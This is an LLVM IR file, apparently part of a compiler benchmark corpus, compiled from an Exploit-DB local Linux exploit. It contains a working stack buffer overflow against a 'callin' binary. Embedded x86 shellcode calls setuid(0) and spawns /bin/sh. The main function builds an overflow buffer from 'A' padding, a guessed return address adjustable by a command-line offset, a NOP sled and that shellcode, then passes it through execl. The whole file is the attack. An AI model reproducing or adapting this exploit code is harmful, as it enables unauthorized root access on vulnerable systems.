; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21302.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21302.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [58 x i8] c")\C0)\DB)\C9)\D2\B0\A4\CD\80\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 16
@.str = private unnamed_addr constant [4 x i8] c"tty\00", align 1
@CINPATH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"callin\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [58 x i8], align 16
  %7 = alloca [300 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = bitcast [58 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([58 x i8], [58 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 58, i1 false)
  store i64 0, i64* %9, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = call i64 @atoi(i8* %16)
  store i64 %17, i64* %9, align 8
  br label %18

18:                                               ; preds = %13, %2
  %19 = getelementptr inbounds [300 x i8], [300 x i8]* %7, i64 0, i64 0
  %20 = call i32 @memcpy(i8* %19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 3)
  store i32 3, i32* %8, align 4
  br label %21

21:                                               ; preds = %28, %18
  %22 = load i32, i32* %8, align 4
  %23 = icmp slt i32 %22, 95
  br i1 %23, label %24, label %31

24:                                               ; preds = %21
  %25 = load i32, i32* %8, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [300 x i8], [300 x i8]* %7, i64 0, i64 %26
  store i8 65, i8* %27, align 1
  br label %28

28:                                               ; preds = %24
  %29 = load i32, i32* %8, align 4
  %30 = add nsw i32 %29, 1
  store i32 %30, i32* %8, align 4
  br label %21

31:                                               ; preds = %21
  %32 = load i64, i64* %9, align 8
  %33 = add i64 3221223036, %32
  %34 = getelementptr inbounds [300 x i8], [300 x i8]* %7, i64 0, i64 0
  %35 = getelementptr inbounds i8, i8* %34, i64 95
  %36 = bitcast i8* %35 to i64*
  store i64 %33, i64* %36, align 8
  store i32 99, i32* %8, align 4
  br label %37

37:                                               ; preds = %44, %31
  %38 = load i32, i32* %8, align 4
  %39 = icmp slt i32 %38, 300
  br i1 %39, label %40, label %47

40:                                               ; preds = %37
  %41 = load i32, i32* %8, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [300 x i8], [300 x i8]* %7, i64 0, i64 %42
  store i8 -112, i8* %43, align 1
  br label %44

44:                                               ; preds = %40
  %45 = load i32, i32* %8, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %8, align 4
  br label %37

47:                                               ; preds = %37
  %48 = getelementptr inbounds [300 x i8], [300 x i8]* %7, i64 0, i64 0
  %49 = getelementptr inbounds [58 x i8], [58 x i8]* %6, i64 0, i64 0
  %50 = call i32 @strlen(i8* %49)
  %51 = sext i32 %50 to i64
  %52 = sub i64 300, %51
  %53 = getelementptr inbounds i8, i8* %48, i64 %52
  %54 = getelementptr inbounds [58 x i8], [58 x i8]* %6, i64 0, i64 0
  %55 = call i32 @strcpy(i8* %53, i8* %54)
  %56 = load i32, i32* @CINPATH, align 4
  %57 = getelementptr inbounds [300 x i8], [300 x i8]* %7, i64 0, i64 0
  %58 = call i32 @execl(i32 %56, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i8* %57, i32 0)
  %59 = load i32, i32* %3, align 4
  ret i32 %59
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @execl(i32, i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
